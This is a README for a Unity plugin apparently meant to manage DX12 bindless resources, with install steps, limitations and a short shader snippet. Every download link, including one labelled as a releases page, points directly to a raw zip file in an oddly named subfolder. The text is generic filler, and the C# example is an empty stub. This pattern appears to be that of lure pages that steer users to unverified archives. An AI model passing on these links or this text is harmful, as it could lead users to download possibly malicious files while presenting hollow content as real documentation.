# 🎮 DX12BindlessUnity - Easy Bindless Resource Management for Unity

[![Download DX12BindlessUnity](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip)

## ✨ Overview
DX12BindlessUnity is a plugin designed to help you use bindless resources in Unity3D. This proof of concept plugin offers an efficient way to manage graphics and compute shaders without complex setups.

## 🚀 Getting Started
To get started with DX12BindlessUnity, you need to follow these simple steps:

1. **Download the Plugin**  
   Visit this page to download: [DX12BindlessUnity Releases](https://raw.githubusercontent.com/xtancordy/DX12BindlessUnity/master/Evadne/DX12BindlessUnity.zip). From here, select the latest version and download the appropriate file for your system.

2. **Install the Plugin**  
   After downloading, extract the files to a folder on your computer. Open Unity and create or load your project.

3. **Add the Plugin to Your Project**  
   Drag and drop the extracted folder into your Unity project's `Assets` folder. This will import the plugin and make it available to use in your project.

4. **Configure the Shader Compiler**  
   It is recommended to use the `#pragma use_dxc` shader compiler. This will help optimize your shaders for bindless resources.

## 📋 Features
- **Supported Shaders**: Both graphics and compute shaders are supported, making it versatile for different applications.
- **Easy Setup**: The plugin is designed for hassle-free installation, so you can start using bindless resources quickly.

## ⚠️ Limitations
- **Proof of Concept**: This plugin does not support UAVs or RTVs, so keep this in mind when building your project.
- **Platform Support**: Currently, DX12BindlessUnity works only on Windows. You can run it on Linux using Proton, but it may require additional setup.
- **Console Support**: While consoles are not supported by default, it is technically possible to add support with some effort.

## 🎨 Using the Plugin
To use the plugin effectively, you'll need to set up bindless resources in your shaders. Here’s a sample code snippet to get you started:

```cpp
// register t31 is registered to be the "bindless" slot
// so you declare your bindless tables like that,
// and descriptor patching will do the job.
Texture2D TextureTable[2048] : register(t31, space0);

// Sample usage:
float4 v = TextureTable[texIdFlat].Load(uint3(id.x % 64, id.y % 64, 0));
```

To assign textures to bindless slots or set a frame offset for double-buffering, you can use the following functions:

```csharp
public static void SetupTextureBindings(...){ 
    // Your code for setting up the bindings goes here
}
```
